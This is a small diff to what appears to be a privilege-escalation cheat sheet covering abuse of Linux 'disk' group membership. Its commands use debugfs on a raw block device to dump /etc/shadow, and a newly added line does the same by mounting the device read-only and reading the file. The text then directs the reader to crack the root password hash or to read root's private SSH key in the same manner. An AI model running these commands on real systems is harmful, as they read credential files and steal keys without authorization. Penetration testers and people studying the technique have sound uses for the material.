@@ -14,6 +14,7 @@ ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 
 ```bash
 debugfs -R 'cat /etc/shadow' /dev/<DEVICE> 2>/dev/null
+# or: sudo mount -o ro /dev/<DEVICE> /mnt && cat /mnt/etc/shadow
 ```
 
 Concatenate the root hash and crack it, or read `/root/.ssh/id_rsa` the same way. `disk` is read-write; `debugfs -w` can edit, but prefer read-only first.
